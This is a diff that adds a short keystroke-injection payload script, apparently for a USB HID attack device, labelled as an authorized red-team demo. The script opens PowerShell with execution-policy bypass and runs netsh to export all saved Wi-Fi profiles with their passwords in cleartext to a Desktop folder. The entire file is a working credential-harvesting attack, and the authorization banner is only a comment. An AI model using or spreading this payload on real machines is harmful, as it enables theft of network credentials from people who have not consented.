@@ -1,0 +1,13 @@
+REM =================================================================
+REM AUTHORIZED RED-TEAM / PENTEST DEMO ONLY – LOCAL EXPORT
+REM Requires user to manually approve UAC + run in consented environment
+REM =================================================================
+
+DELAY 600
+GUI r
+DELAY 400
+STRING powershell -NoP -Exec Bypass
+ENTER
+DELAY 800
+STRING $ts = Get-Date -Format "yyyy-MM-dd_HH-mm"; $p = "$env:USERPROFILE\Desktop\WiFi-Export_$ts"; mkdir $p; netsh wlan export profile key=clear folder=$p; ii $p
+ENTER
